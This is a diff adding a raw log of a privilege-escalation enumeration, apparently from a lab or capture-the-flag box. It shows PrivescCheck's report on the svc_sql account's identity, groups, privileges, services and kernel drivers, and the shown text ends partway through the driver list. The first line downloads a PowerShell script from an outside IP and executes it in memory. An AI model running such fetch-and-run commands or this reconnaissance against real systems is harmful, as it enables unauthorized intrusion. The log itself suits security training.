@@ -1,0 +1,2859 @@
+PS C:\Users\Public> IEX(IWR http://10.10.14.158/PrivescCheck.ps1 -UseBasicParsing); Invoke-PrivescCheck -Extended -Report hc -Format TXT
+WARNING: [MAIN] Option '-Report <FILEPATH>' is deprecated! Check out README for more information.
+WARNING: [MAIN] Option '-Format' is deprecated! Check out README for more information.
+WARNING: [MAIN] Use option '-Force' to ignore warning messages and run immediately.
+┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃ CATEGORY ┃ TA0043 - Reconnaissance                           ┃
+┃ NAME     ┃ User - Identity                                   ┃
+┃ TYPE     ┃ Base                                              ┃
+┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
+┃ Get information about the current user (name, domain name)   ┃
+┃ and its access token (SID, integrity level, authentication   ┃
+┃ ID).                                                         ┃
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+
+
+Name             : UNCLAIMED\svc_sql
+SID              : S-1-5-21-2554513647-1216688035-3073314765-1003
+IntegrityLevel   : Medium Mandatory Level (S-1-16-8192)
+SessionId        : 0
+TokenId          : 00000000-0185d79d
+AuthenticationId : 00000000-00030ed3
+OriginId         : 00000000-000003e7
+ModifiedId       : 00000000-000312e5
+Source           : Advapi (00000000-00030e9e)
+
+
+
+[*] STATUS  : INFO
+[*] TIME    : 00:00:00.030
+[*] SUMMARY : No summary available yet.
+
+
+┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃ CATEGORY ┃ TA0043 - Reconnaissance                           ┃
+┃ NAME     ┃ User - Groups                                     ┃
+┃ TYPE     ┃ Base                                              ┃
+┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
+┃ Get information about the groups the current user belongs to ┃
+┃ (name, type, SID).                                           ┃
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+
+Name                                   Type           SID
+----                                   ----           ---
+UNCLAIMED\None                         Group          S-1-5-21-2554513647-1216688035-3073314765-513
+Everyone                               WellKnownGroup S-1-1-0
+BUILTIN\Users                          Alias          S-1-5-32-545
+BUILTIN\Performance Monitor Users      Alias          S-1-5-32-558
+NT AUTHORITY\SERVICE                   WellKnownGroup S-1-5-6
+CONSOLE LOGON                          WellKnownGroup S-1-2-1
+NT AUTHORITY\Authenticated Users       WellKnownGroup S-1-5-11
+NT AUTHORITY\This Organization         WellKnownGroup S-1-5-15
+NT AUTHORITY\Local account             WellKnownGroup S-1-5-113
+NT SERVICE\MSSQLSERVER                 WellKnownGroup S-1-5-80-3880718306-3832830129-1677859214-2598158968-1052248003
+NT AUTHORITY\LogonSessionId_0_200309   LogonSession   S-1-5-5-0-200309
+LOCAL                                  WellKnownGroup S-1-2-0
+NT AUTHORITY\NTLM Authentication       WellKnownGroup S-1-5-64-10
+Mandatory Label\Medium Mandatory Level Label          S-1-16-8192
+
+
+[*] STATUS  : INFO
+[*] TIME    : 00:00:00.052
+[*] SUMMARY : No summary available yet.
+
+
+┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃ CATEGORY ┃ TA0043 - Reconnaissance                           ┃
+┃ NAME     ┃ User - Restricted SIDs                            ┃
+┃ TYPE     ┃ Extended                                          ┃
+┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
+┃ Get information about potential restricted SIDs applied to   ┃
+┃ the current user.                                            ┃
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+[*] STATUS  : INFO (nothing found)
+[*] TIME    : 00:00:00.002
+[*] SUMMARY : No summary available yet.
+
+
+┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃ CATEGORY ┃ TA0004 - Privilege Escalation                     ┃
+┃ NAME     ┃ User - Privileges                                 ┃
+┃ TYPE     ┃ Base                                              ┃
+┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
+┃ Check whether the current user is granted privileges that    ┃
+┃ can be leveraged for local privilege escalation.             ┃
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+
+Name                          State    Description                    Exploitable
+----                          -----    -----------                    -----------
+SeChangeNotifyPrivilege       Enabled  Bypass traverse checking             False
+SeCreateGlobalPrivilege       Enabled  Create global objects                False
+SeIncreaseWorkingSetPrivilege Disabled Increase a process working set       False
+
+
+[*] STATUS  : INFO
+[*] TIME    : 00:00:00.015
+[*] SUMMARY : No summary available yet.
+
+
+┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃ CATEGORY ┃ TA0004 - Privilege Escalation                     ┃
+┃ NAME     ┃ User - Privileges (GPO)                           ┃
+┃ TYPE     ┃ Base                                              ┃
+┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
+┃ Check whether the current user is granted privileges,        ┃
+┃ through a group policy, that can be leveraged for local      ┃
+┃ privilege escalation.                                        ┃
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+[*] STATUS  : INFO (nothing found)
+[*] TIME    : 00:00:00.008
+[*] SUMMARY : No summary available yet.
+
+
+┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃ CATEGORY ┃ TA0006 - Credential Access                        ┃
+┃ NAME     ┃ User - Environment Variables                      ┃
+┃ TYPE     ┃ Base                                              ┃
+┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
+┃ Check whether any environment variables contain sensitive    ┃
+┃ information such as credentials or secrets. Note that this   ┃
+┃ check follows a keyword-based approach and thus might not be ┃
+┃ completely reliable.                                         ┃
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+
+Name        Value                                                                                                                                                                                                   Keyword
+----        -----                                                                                                                                                                                                   -------
+COMPLUS_MDA InvalidVariant;RaceOnRCWCleanup;InvalidFunctionPointerInDelegate;InvalidMemberDeclaration;ReleaseHandleFailed;MarshalCleanupError;ReportAvOnComRelease;DangerousThreadingAPI;invalidOverlappedToPinvoke api
+
+
+[*] STATUS  : INFO
+[*] TIME    : 00:00:00.010
+[*] SUMMARY : No summary available yet.
+
+
+┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃ CATEGORY ┃ TA0004 - Privilege Escalation                     ┃
+┃ NAME     ┃ Services - Non-Default Services                   ┃
+┃ TYPE     ┃ Base                                              ┃
+┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
+┃ Get information about third-party services. It does so by    ┃
+┃ parsing the target executable's metadata and checking        ┃
+┃ whether the publisher is Microsoft.                          ┃
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+
+
+Name         : MSSQLSERVER
+DisplayName  : SQL Server (MSSQLSERVER)
+ImagePath    : "C:\Program Files\Microsoft SQL Server\MSSQL17.MSSQLSERVER\MSSQL\Binn\sqlservr.exe" -sMSSQLSERVER
+User         : .\svc_sql
+StartMode    : Automatic
+UserCanStart : False
+UserCanStop  : False
+
+Name         : SQLBrowser
+DisplayName  : SQL Server Browser
+ImagePath    : "C:\Program Files (x86)\Microsoft SQL Server\90\Shared\sqlbrowser.exe"
+User         : NT AUTHORITY\LOCALSERVICE
+StartMode    : Disabled
+UserCanStart : False
+UserCanStop  : False
+
+Name         : SQLSERVERAGENT
+DisplayName  : SQL Server Agent (MSSQLSERVER)
+ImagePath    : "C:\Program Files\Microsoft SQL Server\MSSQL17.MSSQLSERVER\MSSQL\Binn\SQLAGENT.EXE" -i MSSQLSERVER
+User         : NT Service\SQLSERVERAGENT
+StartMode    : Automatic
+UserCanStart : False
+UserCanStop  : False
+
+Name         : SQLTELEMETRY
+DisplayName  : SQL Server CEIP service (MSSQLSERVER)
+ImagePath    : "C:\Program Files\Microsoft SQL Server\MSSQL17.MSSQLSERVER\MSSQL\Binn\sqlceip.exe" -Service
+User         : NT Service\SQLTELEMETRY
+StartMode    : Automatic
+UserCanStart : False
+UserCanStop  : False
+
+Name         : SQLWriter
+DisplayName  : SQL Server VSS Writer
+ImagePath    : "C:\Program Files\Microsoft SQL Server\90\Shared\sqlwriter.exe"
+User         : LocalSystem
+StartMode    : Automatic
+UserCanStart : True
+UserCanStop  : False
+
+Name         : ssh-agent
+DisplayName  : OpenSSH Authentication Agent
+ImagePath    : C:\WINDOWS\System32\OpenSSH\ssh-agent.exe
+User         : LocalSystem
+StartMode    : Disabled
+UserCanStart : True
+UserCanStop  : False
+
+Name         : VGAuthService
+DisplayName  : VMware Alias Manager and Ticket Service
+ImagePath    : "C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe"
+User         : LocalSystem
+StartMode    : Automatic
+UserCanStart : False
+UserCanStop  : False
+
+Name         : vm3dservice
+DisplayName  : @oem6.inf,%VM3DSERVICE_DISPLAYNAME%;VMware SVGA Helper Service
+ImagePath    : C:\WINDOWS\system32\vm3dservice.exe
+User         : LocalSystem
+StartMode    : Automatic
+UserCanStart : False
+UserCanStop  : False
+
+Name         : VMTools
+DisplayName  : VMware Tools
+ImagePath    : "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"
+User         : LocalSystem
+StartMode    : Automatic
+UserCanStart : False
+UserCanStop  : False
+
+
+
+[*] STATUS  : INFO
+[*] TIME    : 00:00:02.783
+[*] SUMMARY : No summary available yet.
+
+
+┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃ CATEGORY ┃ TA0004 - Privilege Escalation                     ┃
+┃ NAME     ┃ Services - Non-Default Kernel Drivers             ┃
+┃ TYPE     ┃ Extended                                          ┃
+┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
+┃ Get information about third-party kernel drivers. It does so ┃
+┃ by parsing the driver's metadata and checking whether the    ┃
+┃ publisher is Microsoft.                                      ┃
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+
+
+Name        : 3ware
+ImagePath   : System32\drivers\3ware.sys
+StartMode   : Boot
+Type        : KernelDriver
+Status      : Running
+ProductName : LSI 3ware RAID Controller
+Company     : LSI
+Description : LSI 3ware SCSI Storport Driver
+Version     : 5.01.00.051
+Copyright   : Copyright (c) 2011 LSI
+
+Name        : ADP80XX
+ImagePath   : System32\drivers\ADP80XX.SYS
+StartMode   : Boot
+Type        : KernelDriver
+Status      : Running
+ProductName : PMC-Sierra HBA Controller
+Company     : PMC-Sierra
+Description : PMC-Sierra Storport  Driver For SPC8x6G SAS/SATA controller
+Version     : 1.3.0.10769 (NT.150223-1854)
+Copyright   : Copyright (C) PMC-Sierra 2001-2014
+
+Name        : amdgpio2
+ImagePath   : \SystemRoot\System32\drivers\amdgpio2.sys
+StartMode   : Manual
+Type        : KernelDriver
+Status      : Stopped
+ProductName : AMD GPIO Controller Driver
+Company     : Advanced Micro Devices, Inc
+Description : AMD GPIO Controller Driver
+Version     : 2.2.0.71
+Copyright   : Copyright © 2012-2019 Advanced Micro Devices, Inc
+
+Name        : amdi2c
+ImagePath   : \SystemRoot\System32\drivers\amdi2c.sys
+StartMode   : Manual
+Type        : KernelDriver
+Status      : Stopped
+ProductName : AMD I2C Controller Driver
+Company     : Advanced Micro Devices, Inc
+Description : AMD I2C Controller Driver
+Version     : 1.2.0.99
+Copyright   : Copyright © 2014-2019 Advanced Micro Devices, Inc
+
+Name        : amdsata
+ImagePath   : System32\drivers\amdsata.sys
+StartMode   : Boot
+Type        : KernelDriver
+Status      : Running
+ProductName : AHCI 1.3 Device Driver
+Company     : Advanced Micro Devices
+Description : AHCI 1.3 Device Driver
+Version     : 1.1.3.277 (NT.150223-1854)
+Copyright   : Copyright © 2008-2015 AMD, Inc.
+
+Name        : amdsbs
+ImagePath   : System32\drivers\amdsbs.sys
+StartMode   : Boot
+Type        : KernelDriver
+Status      : Running
+ProductName : AMD Technology AHCI Compatible Controller
+Company     : AMD Technologies Inc.
+Description : AMD Technology AHCI Compatible Controller Driver for Windows - AMD64 platform
+Version     : 3.7.1540.43 (PART3.121207-1123)
+Copyright   : 2012 Advanced Micro Devices, Inc. All rights reserved.
+
+Name        : amdxata
+ImagePath   : System32\drivers\amdxata.sys
+StartMode   : Boot
+Type        : KernelDriver
+Status      : Running
+ProductName : Storage Filter Driver
+Company     : Advanced Micro Devices
+Description : Storage Filter Driver
+Version     : 1.1.3.277 (NT.150223-1854)
+Copyright   : Copyright © 2008-2015 AMD, Inc.
+
+Name        : AppleSSD
+ImagePath   : System32\drivers\AppleSSD.sys
+StartMode   : Boot
+Type        : KernelDriver
+Status      : Running
+ProductName : Boot Camp
+Company     : Apple Inc.
+Description : Apple Solid State Drive Device
+Version     : 6.1.7800.1
+Copyright   : Copyright © 2012 Apple Inc. All Rights Reserved.
+
+Name        : arcsas
+ImagePath   : System32\drivers\arcsas.sys
+StartMode   : Boot
+Type        : KernelDriver
+Status      : Running
+ProductName : Adaptec RAID Controller
+Company     : PMC-Sierra, Inc.
+Description : Adaptec SAS RAID WS03 Driver
+Version     : 7.5.0.32048 (NT.150223-1854)
+Copyright   : Copyright 2014 PMC-Sierra, Inc. All rights reserved.
+
+Name        : b06bdrv
+ImagePath   : System32\drivers\bxvbda.sys
+StartMode   : Boot
+Type        : KernelDriver
+Status      : Running
+ProductName : QLogic Gigabit Ethernet
+Company     : QLogic Corporation
+Description : QLogic Gigabit Ethernet VBD
+Version     : 7.12.31.105
+Copyright   : (c) COPYRIGHT 2014-2016 QLogic Corporation
+
+Name        : bcmfn2
+ImagePath   : \SystemRoot\System32\drivers\bcmfn2.sys
+StartMode   : Manual
+Type        : KernelDriver
+Status      : Stopped
+ProductName : Windows (R) Win 7 DDK driver
+Company     : Windows (R) Win 7 DDK provider
+Description : BCM Function 2  Device Driver
+Version     : 6.3.9600.17336
+Copyright   : © Broadcom Corporation. All rights reserved.
+
+Name        : cht4iscsi
+ImagePath   : System32\drivers\cht4sx64.sys
+StartMode   : Boot
+Type        : KernelDriver
+Status      : Running
+ProductName : Chelsio Communications iSCSI Controller
+Company     : Chelsio Communications
+Description : Chelsio iSCSI VMiniport Driver
+Version     : 6.11.4.100
+Copyright   : Copyright © 2016 Chelsio Communications. All rights reserved.
+
+Name        : cht4vbd
+ImagePath   : \SystemRoot\System32\drivers\cht4vx64.sys
+StartMode   : Manual
+Type        : KernelDriver
+Status      : Stopped
+ProductName : Chelsio Communications Unified Network I/O Controller
+Company     : Chelsio Communications
+Description : Virtual Bus Driver for Chelsio ® T5/T6 Chipset
+Version     : 6.11.4.100
+Copyright   : Copyright © 2016 Chelsio Communications. All rights reserved.
+
+Name        : e1i68x64
+ImagePath   : \SystemRoot\System32\drivers\e1i68x64.sys
+StartMode   : Manual
+Type        : KernelDriver
+Status      : Stopped
+ProductName : Intel(R) Gigabit Adapter
+Company     : Intel Corporation
+Description : Intel(R) Gigabit Adapter NDIS 6.x driver
+Version     : 12.19.1.32
+Copyright   : Copyright(C) 2013, Intel Corporation.  All rights reserved.
+
+Name        : ebdrv
+ImagePath   : System32\drivers\evbda.sys
+StartMode   : Boot
+Type        : KernelDriver
+Status      : Running
+ProductName : QLogic 10 GigE
+Company     : Marvell Semiconductor Inc.
+Description : QLogic 10 GigE VBD
+Version     : 7.13.171.102
+Copyright   : (C)COPYRIGHT 2010-2020 Marvell(R). All rights reserved.
+
+Name        : ebdrv0
+ImagePath   : System32\drivers\evbd0a.sys
+StartMode   : Boot
+Type        : KernelDriver
+Status      : Running
+ProductName : QLogic 10 GigE
+Company     : QLogic Corporation
+Description : QLogic 10 GigE VBD
+Version     : 7.13.65.105
+Copyright   : (c) COPYRIGHT 2014-2016 QLogic Corporation
+
+Name        : HpSAMD
+ImagePath   : System32\drivers\HpSAMD.sys
+StartMode   : Boot
+Type        : KernelDriver
+Status      : Running
+ProductName : Smart Array SAS/SATA Controller Media Driver
+Company     : Hewlett-Packard Company
+Description : Smart Array SAS/SATA Controller Media Driver
+Version     : 8.0.4.0 Build 1 Media Driver (x86-64) (PART_L3.130128-0938)
+Copyright   : Copyright (c) 2004-2011 Hewlett-Packard Development Company, L.P. ALL RIGHTS RESERVED.
+
+Name        : iagpio
+ImagePath   : \SystemRoot\System32\drivers\iagpio.sys
+StartMode   : Manual
+Type        : KernelDriver
+Status      : Stopped
+ProductName : Intel(R) Serial IO GPIO Controller Driver
+Company     : Intel(R) Corporation
+Description : Intel(R) Serial IO GPIO Controller Driver
+Version     : 1.1.1.0
+Copyright   : Copyright (C) 2013.
+
+Name        : iai2c
+ImagePath   : \SystemRoot\System32\drivers\iai2c.sys
+StartMode   : Manual
+Type        : KernelDriver
+Status      : Stopped
+ProductName : Intel(R) Serial IO I2C Driver
+Company     : Intel(R) Corporation
+Description : Intel(R) Serial IO I2C Driver
+Version     : 1.1.1.0
+Copyright   : Copyright (C) 2013.
+
+Name        : iaLPSS2i_GPIO2
+ImagePath   : \SystemRoot\System32\drivers\iaLPSS2i_GPIO2.sys
+StartMode   : Manual
+Type        : KernelDriver
+Status      : Stopped
+ProductName : Intel(R) Serial IO Driver
+Company     : Intel Corporation
+Description : Intel(R) Serial IO GPIO Driver v2
+Version     : 30.100.1816.3
+Copyright   : Copyright © 2015, Intel Corporation.
+
+Name        : iaLPSS2i_GPIO2_BXT_P
+ImagePath   : \SystemRoot\System32\drivers\iaLPSS2i_GPIO2_BXT_P.sys
+StartMode   : Manual
+Type        : KernelDriver
+Status      : Stopped
+ProductName : Intel(R) Serial IO Driver
+Company     : Intel Corporation
+Description : Intel(R) Serial IO GPIO Driver v2
+Version     : 30.100.1816.1
+Copyright   : Copyright © 2015, Intel Corporation.
+
+Name        : iaLPSS2i_GPIO2_CNL
+ImagePath   : \SystemRoot\System32\drivers\iaLPSS2i_GPIO2_CNL.sys
+StartMode   : Manual
+Type        : KernelDriver
+Status      : Stopped
+ProductName : Intel(R) Serial IO Driver
+Company     : Intel Corporation
+Description : Intel(R) Serial IO GPIO Driver v2
+Version     : 30.100.1816.3
+Copyright   : Copyright © 2015, Intel Corporation.
+
+Name        : iaLPSS2i_GPIO2_GLK
+ImagePath   : \SystemRoot\System32\drivers\iaLPSS2i_GPIO2_GLK.sys
+StartMode   : Manual
+Type        : KernelDriver
+Status      : Stopped
+ProductName : Intel(R) Serial IO Driver
+Company     : Intel Corporation
+Description : Intel(R) Serial IO GPIO Driver v2
+Version     : 30.100.1820.1
+Copyright   : Copyright © 2015, Intel Corporation.
+
+Name        : iaLPSS2i_I2C
+ImagePath   : \SystemRoot\System32\drivers\iaLPSS2i_I2C.sys
+StartMode   : Manual
+Type        : KernelDriver
+Status      : Stopped
+ProductName : Intel(R) Serial IO Driver
+Company     : Intel Corporation
+Description : Intel(R) Serial IO I2C Driver v2
+Version     : 30.100.1816.3
+Copyright   : Copyright © 2015, Intel Corporation.
+
+Name        : iaLPSS2i_I2C_BXT_P
+ImagePath   : \SystemRoot\System32\drivers\iaLPSS2i_I2C_BXT_P.sys
+StartMode   : Manual
+Type        : KernelDriver
+Status      : Stopped
+ProductName : Intel(R) Serial IO Driver
+Company     : Intel Corporation
+Description : Intel(R) Serial IO I2C Driver v2
+Version     : 30.100.1816.1
+Copyright   : Copyright © 2015, Intel Corporation.
+
+Name        : iaLPSS2i_I2C_CNL
+ImagePath   : \SystemRoot\System32\drivers\iaLPSS2i_I2C_CNL.sys
+StartMode   : Manual
+Type        : KernelDriver
+Status      : Stopped
+ProductName : Intel(R) Serial IO Driver
+Company     : Intel Corporation
+Description : Intel(R) Serial IO I2C Driver v2
+Version     : 30.100.1929.1
+Copyright   : Copyright © 2015, Intel Corporation.
+
+Name        : iaLPSS2i_I2C_GLK
+ImagePath   : \SystemRoot\System32\drivers\iaLPSS2i_I2C_GLK.sys
+StartMode   : Manual
+Type        : KernelDriver
+Status      : Stopped
+ProductName : Intel(R) Serial IO Driver
+Company     : Intel Corporation
+Description : Intel(R) Serial IO I2C Driver v2
+Version     : 30.100.1820.1
+Copyright   : Copyright © 2015, Intel Corporation.
+
+Name        : iaLPSSi_GPIO
+ImagePath   : \SystemRoot\System32\drivers\iaLPSSi_GPIO.sys
+StartMode   : Manual
+Type        : KernelDriver
+Status      : Stopped
+ProductName : Intel(R) Serial IO Driver
+Company     : Intel Corporation
+Description : Intel(R) Serial IO GPIO Controller Driver
+Version     : 1.1.250.0
+Copyright   : Copyright © 2015, Intel Corporation.
+
+Name        : iaLPSSi_I2C
+ImagePath   : \SystemRoot\System32\drivers\iaLPSSi_I2C.sys
+StartMode   : Manual
+Type        : KernelDriver
+Status      : Stopped
+ProductName : Intel(R) Serial IO Driver
+Company     : Intel Corporation
+Description : Intel(R) Serial IO I2C Controller Driver
+Version     : 1.1.253.0
+Copyright   : Copyright © 2015, Intel Corporation.
+
+Name        : iaStorAVC
+ImagePath   : System32\drivers\iaStorAVC.sys
+StartMode   : Boot
+Type        : KernelDriver
+Status      : Running
+ProductName : Intel(R) Rapid Storage Technology driver (inbox)
+Company     : Intel Corporation
+Description : Intel(R) Rapid Storage Technology driver (inbox) - x64
+Version     : 15.44.0.1015
+Copyright   : Copyright (C), Intel Corporation. All rights reserved.
+
+Name        : iaStorV
+ImagePath   : System32\drivers\iaStorV.sys
+StartMode   : Boot
+Type        : KernelDriver
+Status      : Running
+ProductName : Intel Matrix Storage Manager driver
+Company     : Intel Corporation
+Description : Intel Matrix Storage Manager driver - x64
+Version     : 8.6.2.1019
+Copyright   : Copyright(C) Intel Corporation 1994-2008
+
+Name        : ibbus
+ImagePath   : \SystemRoot\System32\drivers\ibbus.sys
+StartMode   : Manual
+Type        : KernelDriver
+Status      : Stopped
+ProductName : OpenFabrics Windows
+Company     : Mellanox
+Description : InfiniBand Fabric Bus Driver
+Version     : 5.50.14695
+Copyright   : Copyright© 2009 Mellanox Technologies Ltd
+
+Name        : ItSas35i
+ImagePath   : System32\drivers\ItSas35i.sys
+StartMode   : Boot
+Type        : KernelDriver
+Status      : Running
+ProductName : Windows (R) Win 7 DDK driver
+Company     : Avago Technologies
+Description : Avago SAS Gen3.5 Driver (StorPort)
+Version     : 2.61.29.80
+Copyright   : Copyright © Avago Technologies 2015
+
+Name        : LSI_SAS
+ImagePath   : System32\drivers\lsi_sas.sys
+StartMode   : Boot
+Type        : KernelDriver
+Status      : Running
+ProductName : LSI Fusion-MPT SAS Driver (StorPort)
+Company     : LSI Corporation
+Description : LSI Fusion-MPT SAS Driver (StorPort)
+Version     : 1.34.03.83 (NT.150223-1854)
+Copyright   : Copyright © LSI Corporation 2010
+
+Name        : LSI_SAS2i
+ImagePath   : System32\drivers\lsi_sas2i.sys
+StartMode   : Boot
+Type        : KernelDriver
+Status      : Running
+ProductName : Windows (R) Win 7 DDK driver
+Company     : LSI Corporation
+Description : LSI SAS Gen2 Driver (StorPort)
+Version     : 2.00.79.82
+Copyright   : Copyright © LSI Corporation 2012
+
+Name        : LSI_SAS3i
+ImagePath   : System32\drivers\lsi_sas3i.sys
+StartMode   : Boot
+Type        : KernelDriver
+Status      : Running
+ProductName : Windows (R) Win 7 DDK driver
+Company     : Avago Technologies
+Description : Avago SAS Gen3 Driver (StorPort)
+Version     : 2.51.27.80
+Copyright   : Copyright © Avago Technologies 2015
+
+Name        : megasas2i
+ImagePath   : System32\drivers\MegaSas2i.sys
+StartMode   : Boot
+Type        : KernelDriver
+Status      : Running
+ProductName : MEGASAS2i RAID Controller Driver for Windows
+Company     : Avago Technologies
+Description : MEGASAS2i RAID Controller Driver for Windows
+Version     : 6.714.22.00
+Copyright   : Copyright © Avago Technologies2020
+
+Name        : megasas35i
+ImagePath   : System32\drivers\megasas35i.sys
+StartMode   : Boot
+Type        : KernelDriver
+Status      : Running
+ProductName : MEGASAS RAID Controller Driver for Windows
+Company     : Broadcom Inc
+Description : MEGASAS RAID Controller Driver for Windows
+Version     : 7.717.02.00
+Copyright   : Copyright © Broadcom Inc2020
+
+Name        : megasr
+ImagePath   : System32\drivers\megasr.sys
+StartMode   : Boot
+Type        : KernelDriver
+Status      : Running
+ProductName : MegaRAID Software RAID
+Company     : LSI Corporation, Inc.
+Description : LSI MegaRAID Software RAID Driver
+Version     : 15.02.2013.0129
+Copyright   : Copyright (C) 2007 LSI Corporation.
+
+Name        : mlx4_bus
+ImagePath   : \SystemRoot\System32\drivers\mlx4_bus.sys
+StartMode   : Manual
+Type        : KernelDriver
+Status      : Stopped
+ProductName : OpenFabrics Windows
+Company     : Mellanox
+Description : MLX4 Bus Driver
+Version     : 5.50.14695
+Copyright   : Copyright© 2009 Mellanox Technologies Ltd
+
+Name        : mpi3drvi
+ImagePath   : System32\drivers\mpi3drvi.sys
+StartMode   : Boot
+Type        : KernelDriver
+Status      : Running
+ProductName : Windows (R) Win 7 DDK driver
+Company     : Broadcom Limited
+Description : Broadcom MPI 3.0 Driver (StorPort)
+Version     : 3.00.71.90
+Copyright   : Copyright © Broadcom Limited 2019
+
+Name        : mvumis
+ImagePath   : System32\drivers\mvumis.sys
+StartMode   : Boot
+Type        : KernelDriver
+Status      : Running
+ProductName : Marvell Flash Controller
+Company     : Marvell Semiconductor, Inc.
+Description : Marvell Flash Controller Driver
+Version     : 1.0.5.1016  (PART_L3.131021-1012)
+Copyright   : Copyright (c) Marvell Semiconductor, Inc.
+
+Name        : ndfltr
+ImagePath   : \SystemRoot\System32\drivers\ndfltr.sys
+StartMode   : Manual
+Type        : KernelDriver
+Status      : Stopped
+ProductName : OpenFabrics Windows
+Company     : Mellanox
+Description : NetworkDirect Support Filter Driver
+Version     : 5.50.14695
+Copyright   : Copyright© 2009 Mellanox Technologies Ltd
+
+Name        : NDKPerf
+ImagePath   : system32\drivers\NDKPerf.sys
+StartMode   : Manual
+Type        : KernelDriver
+Status      : Stopped
+ProductName : Unknown
+Company     : Unknown
+Description : Unknown
+Version     : Unknown
+Copyright   : Unknown
+
+Name        : NetworkPrivacyPolicy
+ImagePath   : \SystemRoot\System32\DriverStore\FileRepository\networkprivacypolicy.inf_amd64_95f202ccc263e8c7\NetworkPrivacyPolicy.sys
+StartMode   : Automatic
+Type        : KernelDriver
+Status      : Stopped
+ProductName : Unknown
+Company     : Unknown
+Description : Unknown
+Version     : Unknown
+Copyright   : Unknown
+
+Name        : nvraid
+ImagePath   : System32\drivers\nvraid.sys
+StartMode   : Boot
+Type        : KernelDriver
+Status      : Running
+ProductName : NVIDIA nForce(TM) RAID Driver
+Company     : NVIDIA Corporation
+Description : NVIDIA® nForce(TM) RAID Driver
+Version     : 10.6.0.23 (PART_L3.131021-1012)
+Copyright   : Copyright(C) 2001-2011 NVIDIA Corporation
+
+Name        : nvstor
+ImagePath   : System32\drivers\nvstor.sys
+StartMode   : Boot
+Type        : KernelDriver
+Status      : Running
+ProductName : NVIDIA nForce(TM) SATA Driver
+Company     : NVIDIA Corporation
+Description : NVIDIA® nForce(TM) Sata Performance Driver
+Version     : 10.6.0.23 (PART_L3.131021-1012)
+Copyright   : Copyright(C) 2001-2011 NVIDIA Corporation
+
+Name        : percsas2i
+ImagePath   : System32\drivers\percsas2i.sys
+StartMode   : Boot
+Type        : KernelDriver
+Status      : Running
+ProductName : MEGASAS RAID Controller Driver for Windows
+Company     : Avago Technologies
+Description : MEGASAS RAID Controller Driver for Windows
+Version     : 6.805.03.00 (rs1_onecore_stacksp_sfs4(paudina).160302-1205)
+Copyright   : Copyright © Avago Technologies2013
+
+Name        : percsas3i
+ImagePath   : System32\drivers\percsas3i.sys
+StartMode   : Boot
+Type        : KernelDriver
+Status      : Running
+ProductName : MEGASAS RAID Controller Driver for Windows
+Company     : Avago Technologies
+Description : MEGASAS RAID Controller Driver for Windows
+Version     : 6.604.06.00
+Copyright   : Copyright © Avago Technologies2013
+
+Name        : PlutonHsp2
+ImagePath   : \SystemRoot\System32\DriverStore\FileRepository\plutonhsp2.inf_amd64_a7a14e422cdbd8bd\PlutonHsp2.sys
+StartMode   : Manual
+Type        : KernelDriver
+Status      : Stopped
+ProductName : Unknown
+Company     : Unknown
+Description : Unknown
+Version     : Unknown
+Copyright   : Unknown
+
+Name        : pvscsi
+ImagePath   : System32\drivers\pvscsii.sys
+StartMode   : Boot
+Type        : KernelDriver
+Status      : Running
+ProductName : VMware PVSCSI StorPort driver (64-bit)
+Company     : VMware, Inc.
+Description : VMware PVSCSI StorPort driver (64-bit)
+Version     : 1.3.15.0
+Copyright   : Copyright © 1998-2019 VMware, Inc.
+
